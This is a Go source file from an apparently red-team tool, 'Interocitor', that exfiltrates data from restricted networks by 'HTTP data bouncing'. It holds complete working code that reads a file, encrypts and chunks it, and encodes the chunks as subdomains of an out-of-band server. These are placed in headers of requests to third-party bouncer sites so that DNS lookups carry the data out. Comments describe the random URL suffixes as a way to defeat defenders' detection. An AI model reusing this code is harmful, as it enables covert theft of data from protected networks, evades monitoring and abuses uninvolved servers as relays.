// Interocitor
// Application for HTTP data bouncing
//
// Nick Dunn 2023-2024

// Main Package - exfiltration functionality
// These functions are used for data exfltration from the restricted network,
// via the selected DNS server.

package main

import (
	"bufio"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/sha1"
	"encoding/base32"
	"encoding/hex"
	"fmt"
	"io"
	"io/ioutil"
	"net/http"
	"net/http/httputil"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"

	"golang.org/x/exp/maps"

	// Do this to prevent name collision
	mrand "math/rand"
)

// Exfiltrate raw string through the DNS lookup of OOB Server
func ExfiltrateFileData(filePath string, streamID string, oobServer string, key []byte) {

	// Check if the file path is provided
	if filePath == "" {
		fmt.Println("Please provide a file path using the -file flag.")
		return
	}

	// Read the content of the specified binary file
	fileContent, err := ioutil.ReadFile(filePath)
	if err != nil {
		fmt.Println("Error reading binary file:", err)
		return
	}

	// Use exfiltration function to process data from file
	ExfiltrateStringData(string(fileContent), streamID, oobServer, key)
}

// Exfiltrate a file (denoted by filePath) through the DNS lookup of OOB Server
func ExfiltrateStringData(stringData string, streamID string, oobServer string, key []byte) {

	// Check if the file path is provided
	if stringData == "" {
		fmt.Println("No data to exfiltrate.")
		return
	}

	// Encrypt the data
	encryptedData, err := encryptAES([]byte(stringData), key)
	if err != nil {
		fmt.Println("Error encrypting data:", err)
		return
	}

	filehash := generateHashString(encryptedData)

	if GeneralSettings.Verbose {
		// Print the original and encrypted data sizes
		fmt.Printf("Original Data Size: %d bytes\n", len(stringData))
		fmt.Printf("Encrypted Data Size: %d bytes\n", len(encryptedData))
	}

	// Store encrypted data in an array of smaller data chunks (e.g., chunks of 100 bytes)
	chunkSize := 63
	encryptedChunks := chunkData(encryptedData, chunkSize)

	if GeneralSettings.Verbose {
		// Print the number of chunks
		fmt.Printf("Number of Chunks: %d\n", len(encryptedChunks))
	}

	// Write encrypted data to binary file
	payloads := addBytesToURL(filehash, encryptedChunks, streamID, oobServer)

	if GeneralSettings.Verbose {
		// Print the number of chunks
		fmt.Printf("Number of Payloads: %d\n", len(payloads))
	}

	// Submit HTTP request using the collection of URLs as origin
	sendHttpRequests(payloads)

}

// Encrypt data using AES-GCM encryption
func encryptAES(data, key []byte) ([]byte, error) {

	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}

	aesGCM, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}

	nonce := make([]byte, aesGCM.NonceSize())
	if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
		return nil, err
	}

	// Encrypt the data using AES-GCM
	encryptedData := aesGCM.Seal(nil, nonce, data, nil)

	// Prepend the nonce to the encrypted data
	encryptedData = append(nonce, encryptedData...)

	// Encode the result in Base32
	encodedData := make([]byte, base32.StdEncoding.EncodedLen(len(encryptedData)))
	base32.StdEncoding.Encode(encodedData, encryptedData)

	return encodedData, nil
}

// chunkData splits a byte slice into smaller chunks
func chunkData(data []byte, chunkSize int) [][]byte {

	var chunks [][]byte
	for i := 0; i < len(data); i += chunkSize {
		end := i + chunkSize
		if end > len(data) {
			end = len(data)
		}
		chunks = append(chunks, data[i:end])
	}
	return chunks
}

// Write encrypted data to file
func addBytesToURL(filehash string, data [][]byte, streamID string, oobServer string) []string {

	var URLs []string

	// Get the total number of chunks
	chunkCount := len(data)
	totalChunks := strconv.Itoa(chunkCount)

	// Iterate through the chunks and add each one to the URL
	for index := 0; index < chunkCount; index++ {
		// Convert the index to string - this will be part of payload, used to order the chunks for reassembly at other end
		chunkID := strconv.Itoa(index)
		// Convert the data chunk to string (UTF-8 is the default in Go)
		dataFragment := string(data[index])
		fmt.Println("Data Chunk:	", dataFragment)

		// Trim any = signs from end of final chunk, to keep payload safe for URL
		if index == (chunkCount - 1) {
			dataFragment = strings.TrimRight(dataFragment, "=")
			fmt.Println("Data Chunk:	", dataFragment)
		}

		URL := filehash + "." + streamID + "." + chunkID + "." + totalChunks + "." + dataFragment + "." + oobServer
		if GeneralSettings.Verbose {
			fmt.Printf("Payload %d:	%s\n", index, URL)
		}

		// Add new URL to collection
		URLs = append(URLs, URL)
	}

	return URLs
}

func sendHttpRequests(payloads []string) error {

	// Get suitable bounce URL
	target, err := getRandomURL()
	if err != nil {
		fmt.Println("Error while attempting to assign random URL:", err)
		return err
	}

	// Check if we are going to add random paths to the origin URLs
	// Create the array of paths if we need them
	var suffixArray []string
	if GeneralSettings.AppendURL {
		suffixArray = getSuffixArray()
	}

	// Split the target on the first occurrence of "." and assign to target
	prefix := ""
	targetURL := ""
	parts := strings.SplitN(target, ".", 2)

	// Check if the split succeeded and print the result
	if len(parts) == 2 {
		prefix = parts[0]
		targetURL = parts[1]
	} else {
		fmt.Println("Error! Target does not contain a '.' character:", target)
		return fmt.Errorf("invalid target format")
	}

	// Add the http prefix needed to send request
	// ToDo - at some point let user choose prefix
	targetURL = "http://" + targetURL

	// Notify user of traget URL
	fmt.Println("Target URL:	", targetURL)

	// Write to log if required

	// Standard headers
	stdHeaders := map[string]string{
		"Content-Type": "text/html",
		"User-Agent":   OOBSettings.UserAgent,
	}

	// Specify file path containing HTTP header names
	headerFile := "../configs/headers.txt"

	// Read HTTP header types from the file
	headerMap, err := readKeysValsFromFile(headerFile)
	if err != nil {
		fmt.Println("Error reading headers from file:", err)
		return err
	}

	// Get the required header identified by the prefix
	targetHeader := headerMap[prefix]

	// Create an HTTP client to use custom headers
	client := http.DefaultClient

	// Set number of threads, as chosen by user (default = 5)
	numWorkers := GeneralSettings.NumThreads
	jobs := make(chan int, len(payloads))
	var wg sync.WaitGroup

	// Worker function
	for w := 0; w < numWorkers; w++ {
		wg.Add(1)
		go func() {
			defer wg.Done()

			// Set each header type to contain a payload, and dispatch requests
			for index := range jobs {

				payload := payloads[index]

				fmt.Printf("Payload Number:	%d\n", index)
				fmt.Println("Payload Content:	", payload)

				// Add payload to required exfil header(s)
				customHeaders := map[string]string{
					targetHeader: payload,
				}

				// Add a random suffix if requested by the user
				if len(suffixArray) > 0 {
					numsuffs := len(GeneralSettings.URLSuffixes)
					randindex := mrand.Intn(numsuffs)
					targetURL = targetURL + "/" + suffixArray[randindex]
				}

				// Create a new HTTP request to hold custom headers
				req, err := http.NewRequest(OOBSettings.HTTPVerb, targetURL, nil)
				if err != nil {
					fmt.Println("Error building HTTP request:", err)
					continue
				}

				// Merge custom headers into standard headers
				maps.Copy(stdHeaders, customHeaders)
				fmt.Printf("Total Number of Headers: %d\n", len(stdHeaders))

				// Set request headers in HTTP request
				for key, value := range stdHeaders {
					req.Header.Set(key, value)
				}

				// Golang requires us to force the host header to the payload
				if targetHeader == "Host" {
					req.Host = payload
				}
				reqDump, _ := httputil.DumpRequestOut(req, false)

				if GeneralSettings.Verbose {
					fmt.Printf("Request Content:\n%s", string(reqDump))
				}

				// Send the constructed request with payload
				sendRequest(client, req, index)
			}
		}()
		time.Sleep(1 * time.Second)
	}

	// Send jobs to workers
	for index := range payloads {
		jobs <- index
	}
	// Wait for each job to finish
	close(jobs)
	wg.Wait()

	fmt.Println("All payloads exfiltrated.")

	// Return no error if nothing went horribly wrong
	return nil
}

// Send the request that carries the payload inside its header(s)
func sendRequest(client *http.Client, req *http.Request, index int) {

	// Make the HTTP request using the HTTP client - send each request the specified number of times
	for repeat := 0; repeat < GeneralSettings.NumTimes; repeat++ {
		response, err := client.Do(req)
		if err != nil {
			fmt.Printf("Error Sending HTTP Request! Payload No.: %d\n", index)
			reqDump, _ := httputil.DumpRequestOut(req, false)
			fmt.Printf("Request:\n%s", string(reqDump))
			continue
		}

		if GeneralSettings.Verbose {
			fmt.Printf("Repeating: %d\n", repeat)
			fmt.Println("HTTP Response Status:", response.StatusCode, http.StatusText(response.StatusCode))
		}
		defer response.Body.Close()
	}
}

// Randomly choose target from file
func getRandomURL() (string, error) {

	// Specify the file path containing URLs
	filePath := GeneralSettings.BouncersFile

	// Read URLs from the file
	urls, err := ReadArrayFromFile(filePath)
	if err != nil {
		fmt.Println("Error reading URLs from file:", err)
		return "", err
	}

	// Seed the random number generator with the current time
	mrand.Seed(time.Now().UnixNano())

	// Generate a random index to select a URL
	randomIndex := mrand.Intn(len(urls))

	// Return the randomly selected URL
	return urls[randomIndex], err
}

// Read data file and return list of strings
func ReadArrayFromFile(filePath string) ([]string, error) {

	// Open target file
	file, err := os.Open(filePath)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	var items []string

	// Read data from file line by line
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		items = append(items, scanner.Text())
	}

	if err := scanner.Err(); err != nil {
		return nil, err
	}

	return items, nil
}

// Read key and val data from file and return map of key:val pairs
func readKeysValsFromFile(filePath string) (map[string]string, error) {

	// Open target file
	file, err := os.Open(filePath)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	pairs := make(map[string]string)

	// Read the dictionary/map from file, line by line
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {

		line := scanner.Text()

		// Split each line into key and value based on the colon (":") separator
		parts := strings.SplitN(line, ":", 2)
		if len(parts) == 2 {
			key := strings.TrimSpace(parts[0])
			value := strings.TrimSpace(parts[1])
			pairs[key] = value
		}
	}

	if err := scanner.Err(); err != nil {
		return nil, err
	}

	return pairs, nil
}

// Generate a filehash for identification
func generateHashString(binaryData []byte) string {

	// Compute the SHA-1 hash of the binary data
	hash := sha1.New()
	hash.Write(binaryData)
	hashBytes := hash.Sum(nil)

	// Convert the hash to a hex-encoded string
	hashString := hex.EncodeToString(hashBytes)

	return hashString
}

// Return a slice of URL suffixes to be appended to exfiltration URLs
// This will add a layer of obfuscation and help inhibit pattern matching for a defender trying to detect exfiltration
// or make the header URLs look less uniform to anyone casually looking at a log
func buildURLSuffixArrayFromFile(isRandomSample bool) []string {

	var suffixArray []string

	// Read suffixes from file
	fileArray, err := ReadArrayFromFile(GeneralSettings.URLSuffixFile)
	if err != nil {
		println("Error reading URL suffies from file. Headser URLs will have no suffix.")
	}

	// Take random sampling if required
	if isRandomSample && len(fileArray) > 0 {
		suffixArray = GetRandomSampleSlice(fileArray, GeneralSettings.NumSuffixes)
	} else {
		suffixArray = fileArray
	}

	return suffixArray
}

// Return a slice of URL suffixes to be appended to exfiltration URLs
// This will add a layer of obfuscation and help inhibit pattern matching for a defender trying to detect exfiltration
// or make the header URLs look less uniform to anyone casually looking at a log
func buildRandomURLSuffixArray() []string {

	var suffixArray []string
	var charset string

	length := 0
	maxlen := 15

	// Create byte slice to hold randomly generated strings
	bytestr := make([]byte, maxlen)

	// Is prefix required?
	prefix := GeneralSettings.URLPrefix

	// Alphabetic, numeric, or alphanumeric?
	switch GeneralSettings.RandURLFormat {
	case AlphaNum, AppendAlphaNum:
		charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	case Alpha, AppendAlpha:
		charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
	case Num, AppendNum:
		charset = "0123456789"
	}

	// Loop for appropriate number of URL suffixes
	for arraysize := 0; arraysize < 50; arraysize++ {

		// Assign a length to this particular string
		length = mrand.Intn(maxlen) + 1

		// Create byte slice to hold randomly generated strings
		bytestr = bytestr[:length]

		for index := range bytestr {
			bytestr[index] = charset[mrand.Int63()%int64(len(charset))]
		}
		suffix := string(bytestr)

		// Is prefix required?
		if len(prefix) > 0 {
			suffix = prefix + suffix
		}

		// Add the new random string to the slice of random strings
		suffixArray = append(suffixArray, suffix)
	}

	return suffixArray
}

// Get a slice that's a random sample of another slice
func GetRandomSampleSlice(originalArray []string, newLen int) []string {

	// Create a copy of the original slice to avoid modifying it
	sampleArray := make([]string, len(originalArray))
	copy(sampleArray, originalArray)

	// Shuffle the copy of the original slice
	mrand.Shuffle(len(sampleArray), func(i, j int) {
		sampleArray[i], sampleArray[j] = sampleArray[j], sampleArray[i]
	})

	// If n is greater than the length of the original slice, reduce it to the slice length
	if newLen > len(sampleArray) {
		newLen = len(sampleArray)
	}

	// Return the required number of elements of the shuffled slice
	return sampleArray[:newLen]
}

// Build the suffix array
func getSuffixArray() []string {

	var suffixArray []string

	// Check which type of suffix array is needed and what associated values are defined
	if GeneralSettings.AppendURL && GeneralSettings.RandomFolderNames {
		suffixArray = buildRandomURLSuffixArray()
	} else if GeneralSettings.AppendURL && len(GeneralSettings.URLSuffixFile) > 0 {
		suffixArray = buildURLSuffixArrayFromFile(GeneralSettings.RandomURLFileSample)
	}

	return suffixArray
}
